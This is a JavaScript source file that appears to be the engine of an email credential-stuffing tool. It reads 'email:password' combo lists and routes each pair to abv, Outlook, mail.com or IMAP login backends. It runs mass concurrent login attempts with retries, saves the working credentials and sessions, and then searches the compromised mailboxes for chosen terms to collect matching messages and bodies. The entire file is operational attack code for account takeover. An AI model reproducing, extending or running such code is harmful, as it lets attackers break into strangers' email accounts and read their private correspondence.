
import mail from '../conf/servers.js'

import datasource from './@data.js'

import abv from './abv.js'
import imap from './imap.js'
import mailcom from './mailcom.js'
import outlook from './outlook.js'

import resolver from '../resolver/index.js'

import async from 'async'

import path from 'path'
import fs from 'fs'

function loadsessions(){
	const { map, combo, userdata } = datasource.session.load() || { map: {}, combo: [], userdata: {} };
	
	map.combo = combo;
	map.valid = map.combo.length;
	map.create = function ({ user, pass, session }) {
		datasource.session.create({ user, pass, session });
		map[user] = session;
		map.combo.push(`${user}:${pass}`);
		map.valid ++;
	};
	map.update = function ({ user, data, session }) {
		datasource.session.update({ user, data, session });
		if (session) map[user] = session;
		userdata[user] = data;
	};
	map.delete = function({ user, pass }) {
		map[user] = undefined;
		userdata[user] = undefined;
		map.valid--;
		stats.valid--;
//		map.combo.splice(map.combo.indexOf(`${user}:${pass}`), 1);
		datasource.session.delete({ user, pass });
	}
	map.userdata = userdata
	return map
}

let sessions = loadsessions();

const servers = {
	abv: abv(sessions),
	outlook: outlook(sessions),
	mailcom: mailcom(sessions),
	imap: imap(sessions)
}

let running;
let comms;
let stats = {
	total: 0,
	processed: 0,
	valid: 0,
	hits: 0
}
	
let hitlist = [];

function parseuser(lout) {
    let atdx = lout.indexOf("@")
    let btdx = lout.search(/[: |#]/)
    if (atdx > 0 && btdx > 0) {
        let user = lout.substr(0, btdx).toLowerCase();
        let pass = lout.substr(btdx+1);
        let domain = user.substr(atdx+1);
        return { user, domain, pass }
    } else return {}
}

function select(domain, email, tries) {
	return new Promise(resolve=>{
		
		let server = mail[domain];
		if (server) {
			if (server[1] === 143 || server[1] === 993) return resolve(servers.imap(server[0], server[1]));
			else resolve();

		} else if (servers.abv.DOMAINS.includes(domain)) {
			return resolve(servers.abv);

		} else if (servers.outlook.DOMAINS.includes(domain)) {
			return resolve(servers.outlook);

		} else if (servers.mailcom.DOMAINS.includes(domain)) {
			return resolve(servers.mailcom);

		} else {

			(function discover_mailserver(tries) {
				let cancelled = false;

				let timedout = setTimeout(function(){
					cancelled = true;

					if (tries < 3) {
						discover_mailserver(tries+1);
					} else {
						resolve();
					}
				}, 45000);

				resolver(domain, email).then(server=>{
					if (!cancelled) {
						if (server?.type === "imap") return resolve(servers.imap(server.hostname, server.port));
						else resolve();
					}
				})
			})(0)
		}
	})
}

function base({ pnid, action, term, combo }) {
	
	running = action;

	stats = {
		total: combo.length,
		processed: 0,
		valid: 0,
		hits: 0
	}

	function _q_(size){
		return async.queue((task, cb)=>{
			task(cb);
		},size);
	}
	
	const queue = {
		_triage_: _q_(100),
		main: _q_(65),
		outlook: _q_(25),
		abv: _q_(1)
	}

	let pending = [...combo];


	if (!pnid) {
		if (action === "combo") {
			pnid = datasource.combo.create(pending);
		} else {
			pnid = datasource.search.create(term, hitlist, pending)
		}
	}

	let deletes = [];
	let pendlock = false;
	let pendindex = 0;
	let pendintv = setInterval(function(){
		if (!pendlock) {
			pendlock = true;
			for (let d of deletes) {
				let i = pending.indexOf(d);
				pending.splice(i, 1);
			}

			pendindex++;
			if (action === "combo" && pendindex === 5) {
				pendindex = 0;
				datasource.combo.update(pnid, pending);
			} else if (action === "search" && pendindex === 10) {
				pendindex = 0;
				datasource.search.update(pnid, hitlist, pending);
			}

			pendlock = false;
		}
	},1000)

	function factory(domain, user, pass) {
		return async cb=>{
			select(domain).then(server=>{
				if (server) {
					queue[server.queue].push(cb2=>{
						(function execute(tries) {
							let cancelled = false;

							let timedout = setTimeout(function(){
								cancelled = true;

								if (tries < 3) {
									execute(tries+1)
								} else {
									cb2();
								}
							}, 60000);

							server.login(user, pass).then(async api => {
								clearInterval(timedout);

								if (!cancelled) {
									if (api.success) {
										stats.valid++

										if (action === "search") {
											const list = await api.search(term);
											if (!list.error) {
												if (list.results.length > 0) {
													stats.hits++
													list.user = user;
													list.pass = pass;
													list.domain = domain;
													hitlist.push(list);

													if (comms) comms.hits(list);
												}
											} else  {
												console.log("Search Error:", list.error);
											}
										}
									} else if (api.error){
										console.log("Login Error:", api.error);
									}

									stats.processed++
									deletes.push(`${user}:${pass}`)
									cb2();
								}
							})
						})(0);
					})
					cb();
				} else {
					stats.processed++
					deletes.push(`${user}:${pass}`)
					cb();
				}
			})
		}
	}

	for (let entry of combo) {
		let { user, domain, pass } = parseuser(entry);
		if (user && domain && pass) {
			queue["_triage_"].push(factory(domain,user,pass));
		} else {
			stats.total--;
		}
	}

	const NOOP = (N=>{});

	queue["_triage_"].drain(function() {

		let _started_ = [];
		
		if (queue.abv.started) _started_.push(queue.abv.drain());
		if (queue.outlook.started) _started_.push(queue.outlook.drain());
		if (queue.main.started) _started_.push(queue.main.drain());

		Promise.all(_started_).then(function(){

			if (action === "combo") {
				datasource.combo.delete(pnid);
			} else {
				hitlist.sort(function(a,b){
					return (a.results[0].date < b.results[0].date) ? -1:1
				})
				datasource.search.update(pnid, hitlist, []);
			}
			running = undefined;
			if (comms) comms.finish();
		})
	});

	return {
		progress() {
			return stats;
		}
	}
}

let restart = datasource.search.incomplete();
if (restart) {
	hitlist = JSON.parse(restart.hits);
	base({
		prid: restart.id,
		combo: JSON.parse(restart.pending),
		term: restart.term,
		action: "search"
	})
} else {
	restart = datasource.combo.incomplete();
	if (restart) {
		base({
			prid: restart.id,
			combo: JSON.parse(restart.pending),
			action: "combo"
		})
	}
}

export default {

	combo({ combo, finish }) {
		return base({ action: "combo", combo, finish })
	},

	search({ term, hits, finish }) {
		hitlist = [];
		return base({ action: "search", combo: sessions.combo, term, hits, finish })
	},

	qssess({ qssess }){
		return new Promise(resolve=>{
			datasource.session.import(qssess);
			sessions = loadsessions();
			resolve({
				action: "imported",
				valid: sessions.valid
			})
		})
	},

	body(user, id) {
		return new Promise(async resolve=>{
			const domain = user.substr(user.indexOf("@")+1);
			const server = await select(domain);
			const api = await server.login(user);
			const body = await api.body(id);

			resolve(body);
		})
	},
	
	subsearch({ user, pass, domain, term }) {
		return new Promise(resolve=>{
			select(domain).then(server=>{
				if (server) {
					server.login(user, pass).then(async api => {
						if (api.success) {
							const list = await api.search(term);
							if (!list.error) {
								if (list.results.length > 0) {
									list.action = "subsearch";
									return resolve(list);
								}
							}
						}
						
						resolve({ error: "err" });
					})
				} else {
					resolve({ error: "no server" });
				}
			})
		})
	},

	begin() {
		let query, message = { 
			action: "begin",
			valid: sessions.valid 
		};
		if (running) {
			if (running === "search") {
				let run = datasource.search.incomplete();
				if (run) {
					message.running = running;
					message.hits = run.hits;
					message.term = run.term;
				}
			}

			query = {
				progress() {
					return stats;
				}
			}
		}
		return {
			message,
			query
		}
	},

	comms(opt){
		comms = opt;
	}
 }